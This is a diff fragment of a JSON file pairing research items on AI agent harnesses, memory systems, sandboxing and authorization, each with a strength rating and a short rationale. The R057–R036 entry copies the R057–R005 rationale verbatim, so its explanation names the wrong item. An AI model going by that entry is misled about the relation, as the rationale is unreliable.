+   "why": "R006 names the harness parts; R056 names the agent parts. Teach them as one vocabulary, and R056's missing-terms list is mostly R006's."
+  },
+  {
+   "a": "R056",
+   "b": "R023",
+   "strength": "strong",
+   "why": "R056 is the map; R023 builds every term in code. The session plan's build, break and resume steps can draw their labs from R023."
+  },
+  {
+   "a": "R056",
+   "b": "R015",
+   "strength": "strong",
+   "why": "R056's second correction (workflows before orchestrators) is R015's argument in one line."
+  },
+  {
+   "a": "R057",
+   "b": "R040",
+   "strength": "strong",
+   "why": "The closest pair. Both keep the raw record linked under every distilled statement and let the agent descend to it; both show the raw layer matters most. WikiTrace distills lessons from task runs and reports Regression; SoMem lets the agent choose the structure for conversational facts."
+  },
+  {
+   "a": "R057",
+   "b": "R002",
+   "strength": "strong",
+   "why": "Source, Topic and Core map onto R002's episodic, semantic and profile layers, and SoMem's validated edits plus reorganization passes are the maintenance step R002 says usually goes missing. Contradictions remain the weak spot in both."
+  },
+  {
+   "a": "R057",
+   "b": "R028",
+   "strength": "strong",
+   "why": "Same split (model for meaning, code for checks), opposite schema bet: R028 types memory into validated tables, R057 lets the schema emerge from Markdown and validates only structure and provenance."
+  },
+  {
+   "a": "R057",
+   "b": "R055",
+   "strength": "strong",
+   "why": "Relate stores memory as a graph database; SoMem derives its graph from Markdown links as a code-built view, with no database."
+  },
+  {
+   "a": "R057",
+   "b": "R054",
+   "strength": "strong",
+   "why": "R054 finds production coding harnesses keep memory in files and ripgrep; SoMem is benchmark evidence that files plus agentic search beat vector-store memory systems on conversational recall."
+  },
+  {
+   "a": "R057",
+   "b": "R005",
+   "strength": "strong",
+   "why": "R005's linked second brain and Anthropic's small injected memory layer are the same direction; SoMem's Core is that small layer, size-capped by code."
+  },
+  {
+   "a": "R057",
+   "b": "R036",
+   "strength": "strong",
+   "why": "R005's linked second brain and Anthropic's small injected memory layer are the same direction; SoMem's Core is that small layer, size-capped by code."
+  },
+  {
+   "a": "R057",
+   "b": "R010",
+   "strength": "strong",
+   "why": "Retrieval as navigation, measured: iterative read-and-follow-links beats one-shot retrieval by 30 to 40 points."
+  },
+  {
+   "a": "R058",
+   "b": "R020",
+   "strength": "strong",
+   "why": "The playbook's \"skills are advisory, hooks are deterministic\" and \"the agent cannot edit the test that judges it\" are R020's harness-enforces thesis written as process."
+  },
+  {
+   "a": "R058",
+   "b": "R017",
+   "strength": "strong",
+   "why": "Both are spec-first delivery; EGM's fresh-context reviewers are a stronger version of the playbook's spec and PR review passes."
+  },
+  {
+   "a": "R058",
+   "b": "R052",
+   "strength": "strong",
+   "why": "The playbook's PR-review play (REVIEW.md, severity tiers, capped nits) is the slot a dedicated reviewer like Open Code Review fills."
+  },
+  {
+   "a": "R058",
+   "b": "R031",
+   "strength": "strong",
+   "why": "The Maintain stage's closed loop (band breach, diagnose, PR or runbook) is incident response feeding back into planning."
+  },
+  {
+   "a": "R059",
+   "b": "R040",
+   "strength": "strong",
+   "why": "Memory Tax measures the cost of rewriting history; WikiTrace avoids most of it by keeping the evidence behind each lesson."
+  },
+  {
+   "a": "R061",
+   "b": "R030",
+   "strength": "strong",
+   "why": "Two ends of the sandbox ladder: a restricted interpreter for computation versus kernel-enforced OS sandboxes for tool use."
+  },
+  {
+   "a": "R062",
+   "b": "R055",
+   "strength": "strong",
+   "why": "OAuth scopes are coarse; R055's read/write tool split is the tool-level least privilege a server can map scopes onto."
+  },
+  {
+   "a": "R062",
+   "b": "R030",
+   "strength": "strong",
+   "why": "Credentials versus reach: authorization bounds what a token can call, OpenShell's kernel policy bounds what the agent process can touch."
+  },
+  {
+   "a": "R062",
+   "b": "R048",
+   "strength": "strong",
+   "why": "The Medicare portal breach is the failure R062's least-privilege and audience rules exist to prevent."
+  },
+  {
+   "a": "R063",
+   "b": "R024",
+   "strength": "strong",
+   "why": "Both close loops inside a training run that cannot be repeated whole; R024 tunes throughput, R063 the run's research decisions."
   }
  ]
 }
